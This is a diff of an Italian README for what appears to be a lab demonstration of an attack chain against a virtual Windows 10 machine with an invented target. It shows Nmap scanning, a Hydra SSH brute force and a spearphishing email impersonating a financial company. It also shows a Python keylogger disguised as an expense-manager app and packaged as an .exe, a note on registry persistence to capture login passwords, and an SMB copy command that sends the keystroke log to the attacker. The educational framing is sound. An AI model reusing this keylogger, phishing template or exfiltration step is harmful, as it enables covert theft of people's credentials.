@@ -14,34 +14,50 @@
 
 ### 1. Descrizione dell'attacco
 
-In questa demo svolgerò il ruolo di attaccante, l'attacco che ho creato inizia con il presupposto di essere nella rete di una azienda e conoscendo l'indirizzo IP di un dispositivo aziendale per me interessante. Successivamente, lancerò un attacco di spearphishing mirato, seguito dall'iniezione di un keylogger (con l'aiuto del bersaglio), sottoforma di software lecito. Il keylogger mi permetterà di conoscere tutto quello che il bersaglio digiterà.
+In questa demo svolgerò il ruolo di attaccante. L'attacco che ho creato inizia con il presupposto di essere nella rete di una azienda e di conoscere l'indirizzo IP di un dispositivo aziendale per me interessante. Successivamente, lancerò un attacco di spearphishing, seguito dall'iniezione di un keylogger (con l'aiuto del bersaglio), sottoforma di software lecito (chiamato poi manager spesa). Il keylogger mi permetterà di conoscere tutto quello che il bersaglio digiterà.
+
+Il bersaglio avrà il nome di Alessandro, personaggio da me inventato. Suppongo che sia in possesso di un account di un qualsiasi social media da cui posso raccogliere informazioni relative alla sua vita e al suo lavoro.
 
 ### 2. Strumenti utilizzati
 
 Io opero da Kali Linux __[12]__ (su Virtual Box __[11]__) e Windows 11 (SO nativo del mio dispositivo), mentre il bersaglio opera su Windows 10 Home __[13]__ (su Virtual Box __[11]__).
 
-Da Kali uso Nmap __[1]__ per investigare sull’indirizzo IP, Hydra __[2]__ per cercare username e password del servizio SSH, SMB per estrarre i file utilizzando lo strumento impacket [7] per creare la connessione. Per questa fase ho preso spunto dal sito Juggernaut-sec.com al link [3].
+Da Kali:
 
-Da Windows 11: ho programmato l'interfaccia utente del manager usando la libreria Tkinter di Python [5], in seguito ho iniziato a sviluppare il keylogger partendo da un codice base di un esempio visto su YouTube [4], che ho poi migliorato con l'aiuto di BlackBox AI [10]; l'arricchimento del codice relativo al keylogger riguarda: la configurazione del percorso per salvare il file log.txt, l'aggiunta di una separazione più chiara tra la pressione dei tasti e il rilascio dei tasti e l'inserimento della data e dell'ora.
++ Uso il tool Nmap __[1]__ per investigare sull’indirizzo IP;
++ Uso il tool Hydra __[2]__ per cercare username e password del servizio SSH;
++ Sfrutto il protocollo SMB per estrarre i file utilizzando lo strumento impacket [7] per creare la connessione. Per questa fase ho preso spunto dal sito Juggernaut-sec.com [3].
+
+Da Windows 11: ho programmato l'interfaccia utente del manager di spesa usando la libreria Tkinter di Python [5], in seguito ho iniziato a sviluppare il keylogger partendo da un codice base di un esempio visto su YouTube [4], che ho poi migliorato con l'aiuto di BlackBox AI [10]; l'arricchimento del codice relativo al keylogger riguarda:
+
++ La configurazione del percorso per salvare il file log.txt;
++ L'aggiunta di una separazione più chiara tra la pressione e il rilascio dei tasti;
++ L'inserimento della data e dell'ora.
 
 Successivamete ho riunito entrambi due programmi in un singolo script.
 
 Infine ho salvato il file da in .pyw e l'ho convertito in .exe con la libreria Pyinstaller [6] di Python, personalizzando anche l'icona dell'eseguibile (segue la spegazione).
 
-Affinche l'applicazione fosse compatibile con il sistema Windows 10, ho dovuto usare la libreria pyinstaller su windows 11 perchè pyinstaller non supporta la creazione di eseguibili Windows da un altro sistema operativo; quando viene creato l'eseguibile, la libreria pyinstaller, include anche i file dipendenti dal sistema operativo, come DLL (Dynamic-Link Libraries) su Windows.
+#### Note sulla creazione dell'eseguibile
+
+Affinche l'applicazione fosse compatibile con il sistema Windows 10, ho dovuto usare la libreria pyinstaller su un disposito con sistema operativo Windows e ho scelto windows 11. Il motivo è che pyinstaller non supporta la creazione di eseguibili Windows da un altro sistema operativo. Quando viene creato l'eseguibile, la libreria pyinstaller, include anche i file dipendenti dal sistema operativo, come DLL su Windows.
 
 ### 3. Configurazione Windows 10 Home
 
-Windows 10 ha richiesto delle configurazioni particolari prima di essere utilizzato:
+Windows 10 ha richiesto delle configurazioni particolari prima di essere utilizzato, che sono:
 
-+ La disattivazione del firewall e della scansione in tempo reale.
-+ Modifiche riguardo i privilegi dell'utente: utilizzando una utility di Windows di nome secpol.msc accedibile attraverso prompt dei comandi come amministratore e modificando la sezione riguardante "Criteri Locali"->"Assegnazioni Diritti Utente". 
-+ Attivazione dei Servizi SSH e SMB, fatta tramite "Impostazioni"->"Funzionalità Facoltative".
-+ Per permettere a Windows 10 di rispondere ai ping e consentire la scansione con Nmap da un altro computer c'è stato bisogno di modificare le impostazioni riguardo le connessioni in entrata accedendo a Windows Defender Firewall e modificando la regole riguardanti ICMP Echo Request e TCP/UDP.
++ La disattivazione del firewall e della scansione in tempo reale;
++ Alcune modifiche riguardo i privilegi dell'utente: utilizzando l'utility di Windows di nome secpol.msc accedibile attraverso prompt dei comandi come amministratore e modificando la sezione riguardante "Criteri Locali"->"Assegnazioni Diritti Utente";
++ L'attivazione dei Servizi SSH e SMB, fatta tramite "Impostazioni"->"Funzionalità Facoltative".
++ Per permettere a Windows 10 di rispondere ai ping e consentire la scansione con Nmap da un altro computer c'è stato bisogno di modificare le impostazioni riguardo le connessioni in entrata accedendo a Windows Defender Firewall e aggiungendo le regole riguardanti ICMP Echo Request e TCP/UDP.
 
 ### 4. Note sulla demo
 
-La demo non comprende le modifiche delle configurazioni relative ai sistemi operativi; il video presenta alcuni tagli e velocizzazioni a causa della lentezza della macchina virtuale con il SO Windows 10 Home.
+La demo non comprende le modifiche delle configurazioni relative ai sistemi operativi. Il video presenta alcuni tagli e velocizzazioni a causa della lentezza della macchina virtuale con il SO Windows 10 Home, fa fede l'orologio dei SO che, sono stati sincronizzati tra loro.
+
+### 5. Note di utilizzo per il keylogger
+
+Il keylogger può essere modificato per essere inserito all'avvio di Windows modificando le chiavi del registro in modo da loggare anche la password dell'utente al momento effettivo del login sul device. La modifica può essere effettuata aggiungendo questa parte di codice.
 
 <br>
 
@@ -61,7 +77,7 @@ L'output rivela che l'azienda ha configurato una device Windows in cui sono atti
 
 ---
 
-Dopo aver identificato i servizi SSH e SMB attivi sul dispositivo, procedo con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. Uso le opzioni -L e -P per specificare rispettivamente due dizionari, che mi sono costruita, di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
+Dopo aver identificato i servizi SSH e SMB attivi sul dispositivo, procedo con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. Uso le opzioni -L e -P per specificare rispettivamente due dizionari, che mi sono costruita precedentemente, di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
 
 ![Descrizione immagine](./images/hydra.png)
 
@@ -69,10 +85,10 @@ Scopro l'uso di credenziali predefinite da parte dell'amministratore, e procedo 
 
 ![Descrizione immagine](./images/Inizio_SSH.png)
 
-Ottengo l'accesso alla shell nel dispositivo dell'azienda e, con il comando whoami, verifica l'identità della shell (che è quella dell'amministratore). 
+Ottengo l'accesso alla shell nel dispositivo dell'azienda e, con il comando whoami, verifica l'identità della shell (che è quella dell'amministratore).
 
-Effettuo una navigazione tra i file e scopro la presenza di un altro utente: Alessandro.
-Nella sua cartella Documents, trovo un file di nome "biglietto da visita", lo apro e trovo le informazioni di contatto di Alessandro come il nome completo e la mail. 
+Navigo tra i file e scopro la presenza di un altro utente: Alessandro.
+Nella sua cartella Documents, trovo un file di nome "Biglietto da visita.txt", lo apro e trovo le informazioni di contatto di Alessandro come il nome completo e la mail.
 
 ![Descrizione immagine](./images/Bigl_da_visita.png)
 
@@ -86,8 +102,8 @@ Faccio una ricerca sui social media e scopro che Alessandro è un grande appassi
 
 ### 1. Programmazione del Keylogger e dell'interfaccia grafica del gestore
 
-Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger (utilizzando la piattaforma Visual Code Studio [8]).
-Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file di nome "log.txt" nella cartella "C:\Windows\Temp" da me scelta. La scelta della cartella è stata arbitraria, potevo scegliere qualsiasi altro percorso. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
+Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger; la programmazione l'ho effettuata su Visual Code Studio [8].
+Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da Alessandro e li salva in un file di nome "log.txt" nella cartella "C:\Windows\Temp" da me scelta. La scelta della cartella è stata arbitraria, potevo scegliere qualsiasi altro percorso. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte finale del codice rappresenta solo il keylogger (preceduta da un commento per chiarezza):
 
 ```python
 
@@ -123,6 +139,7 @@ window.title("Manager Spese")
 window.grid_rowconfigure(0, weight=1)
 window.grid_columnconfigure(0, weight=1)
 
+# Sezione dei bottoni e degli spazi per l'inserimento dei caratteri
 label_amount = tk.Label(window, text="Ammontare:")
 label_amount.grid(row=0, column=0, padx=(10, 2), pady=5)
 entry_amount = tk.Entry(window)
@@ -142,6 +159,7 @@ radio_income.grid(row=2, column=1, padx=(2, 10), pady=5)
 button_add = tk.Button(window, text="Aggiungi Transazione", command=add_transaction)
 button_add.grid(row=4, column=0, columnspan=2, pady=10)
 
+# Sezione di visualizzazione tabellare all'interno della applicazione
 tree = tk.ttk.Treeview(window, columns=("data", "ammontare", "descrizione", "categoria"))
 tree.heading("#0", text="Date")
 tree.heading("ammontare", text="Ammontare")
@@ -164,7 +182,7 @@ class KeyLogger:
         self.log_file_name = log_file_name
         self.log_file_path = os.path.join(self.log_directory, self.log_file_name)
 
-        # Creare la directory dei log se non esiste
+        # Crea la directory dei log se non esiste
         os.makedirs(self.log_directory, exist_ok=True)
 
     def log(self, message):
@@ -189,7 +207,7 @@ class KeyLogger:
         self.log(log_message)
         print(log_message, end='')
         
-        # ferma il keylogger al rilascio del tasto esc. Questa opzione è stata inserita in fase di test per fermarne l'esecuzione
+        # Opzionale: Ferma il keylogger al rilascio del tasto esc. Questa opzione è stata inserita in fase di test per fermarne l'esecuzione
         if key == 'Key.esc':
             return False
 
@@ -203,7 +221,7 @@ if __name__ == "__main__":
 
 ```
 
-Ho salva lo script in formato .pyw perchè questa estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione trasformo lo script da .py a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. Ho scelto una icona a mio piacimento e l'ho converte in .ico (attraverso un sito web [9]), dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando: 
+Ho salva lo script in formato .pyw perchè questa estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione trasformo lo script da .py a .exe sfruttando la libreria pyinstaller (per specifiche vedi note precedenti per la creazione del .exe); essa prende lo script in Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie rendendo possibile l'esecuzione del programma su computer con Python non installato. Ho scelto una immagine a mio piacimento (con nome Icona.jpg) e l'ho convertita in .ico (attraverso un sito web [9]), dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando:
 
 ```shell
 pyinstaller --onefile --icon=Icona.ico Gestore_di_spesa.py
@@ -211,11 +229,11 @@ pyinstaller --onefile --icon=Icona.ico Gestore_di_spesa.py
 
 Questo comando creerà nella directory che ho scelto il file Gestore_di_spesa.exe con l'immagine Icona.ico da me scelta. Successivamente ho cambiato il nome dell'eseguibile in "Manager Spesa".
 
-L'eseguibile lo invio mia e-mail (attraverso Drive a causa della grandezza del file) con il corpo citato prima.
+L'eseguibile lo invio poi via e-mail come link attraverso Drive (a causa della grandezza del file) con il corpo del testo citato prima.
 
 ### 2. Invio mail personalizzata
 
-Utilizzo le informazioni raccolte su Alessandro, per creare un'email altamente personalizzata. L'email finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. Il sottostante è il testo della mail che ho scritto:
+Utilizzo le informazioni raccolte su Alessandro, per creare un'e-mail personalizzata. L'e-mail finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. Il sottostante è il testo della mail che ho scritto:
 
 <br>
 
@@ -244,7 +262,7 @@ Il Team di Gestore di Spesa
 
 </blockquote>
 
-Alessandro accede alla sua casella di posta, e legge la mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato all'e-mail. Il file in questione si presenta con il nome di "Manager spesa.exe" che è il file malevolo creato da me (l'attaccante).
+Alessandro accede alla sua casella di posta, e legge la e-mail proviente dal team di Gestore Spese. Interessato all'opportunità decide di fare il download dell'allegato, il file si presenta con il nome di "Manager spesa.exe" che è il file malevolo creato da me (l'attaccante).
 
 ### 3. Funzionamento del Software Malevolo
 
@@ -268,11 +286,11 @@ Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informaz
 
 ---
 
-Dopo aver apettato un periodo di tempo ragionevole prima di estrarre il file con le informazioni, sfrutto il protocollo SMB per estrarre il file log.txt contenente le sequenze di tasti catturate.
+Trascorso un periodo di tempo ragionevole in cui l'utente utilizza il suo computer, sfrutto il protocollo SMB per estrarre il file "log.txt" contenente le sequenze di tasti catturate.
 
-### 1. Configurazione del Server SMB sull'Attaccante
+### 1. Configurazione del Server SMB
 
-Ho configurato il server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete, tra il dispositivo del bersaglio e il mio, alla quale posso accedere per copiare i file del bersaglio sul mio dispositivo. Il comando seguente avvia il server SMB sul mio computer:
+Ho configurato il server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete, tra il dispositivo del bersaglio e il mio. Il comando seguente avvia il server SMB sul mio computer:
 
 ![Descrizione immagine](./images/Inizio_SMB.jpg)
 
@@ -280,13 +298,13 @@ Questo comando crea una condivisione SMB denominata hax nella directory da me sc
 
 ### 2. Navigazione sulla Macchina della Vittima
 
-Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), verifico la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
+Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), verifico la posizione del file "log.txt" generato dal keylogger. Il file è collocato nella directory "C:\Windows\temp" per costruzione del keylogger.
 
 ![Descrizione immagine](./images/Temp.png)
 
 ### 3. Copia del File log.txt tramite SMB
 
-Utilizzo il comando copy di Windows per copiare il file log.txt dalla macchina della vittima alla condivisione SMB sul mio dispositivo. Ecco il comando eseguito sulla macchina della vittima attraverso il protocollo SSH:
+Utilizzo il comando copy di Windows per copiare il file "log.txt" dalla macchina bersaglio alla condivisione SMB sul mio dispositivo. Di seguito il comando eseguito sulla macchina del bersaglio:
 
 ```cmd
 copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
@@ -300,7 +318,7 @@ Posso verificare che lo spostamento del file è avvenuto nel terminale che ha us
 
 ![Descrizione immagine](./images/verificata_connessione.png)
 
-Esempio del file log.txt ottenuto:
+Esempio del file "log.txt" ottenuto:
 
 ![Descrizione immagine](./images/log.txt.png)
 
@@ -335,34 +353,34 @@ Gli eventi chiave dell'attacco sono:
     + <https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Transferring_Files_to_and_from_Attackers_SMB_Server>
 
 4. File preso come esempio per la programmazione del keylogger:
-    + https://www.youtube.com/watch?v=kQFl-MVrvwc&t=211s
+    + <https://www.youtube.com/watch?v=kQFl-MVrvwc&t=211s>
 
 5. Costruzione di gestore di spesa.exe con la libreria tkinter di python:
-    + https://www.programmareinpython.it/interfacce-grafiche-python-con-tkinter/1-introduzione-alle-gui-con-tkinter/
+    + <https://www.programmareinpython.it/interfacce-grafiche-python-con-tkinter/1-introduzione-alle-gui-con-tkinter/>
 
 6. Creazione dell'eseguibile con la libreria pyinstaller:
-    + https://pyinstaller.org/en/stable/
+    + <https://pyinstaller.org/en/stable/>
 
 7. Impacket scripts:
 
-	+ https://www.kali.org/tools/impacket-scripts/
+    + <https://www.kali.org/tools/impacket-scripts/>
 
 8. Visula Studio Code:
 
-    + https://code.visualstudio.com/
+    + <https://code.visualstudio.com/>
 
 9. Sito per trasforma una immagine in .ico:
 
-    + https://convertio.co/it/
+    + <https://convertio.co/it/>
 
 10. BlackBox AI:
-    + https://www.blackbox.ai/
+    + <https://www.blackbox.ai/>
 
 11. Virtual Box:
-    + https://www.virtualbox.org/
+    + <https://www.virtualbox.org/>
 
 12. Kali Linux versione virtual machine:
-    + https://www.kali.org/get-kali/#kali-virtual-machines
+    + <https://www.kali.org/get-kali/#kali-virtual-machines>
 
 13. Windows 10 Home:
-    + https://www.microsoft.com/it-it/software-download/windows10
+    + <https://www.microsoft.com/it-it/software-download/windows10>
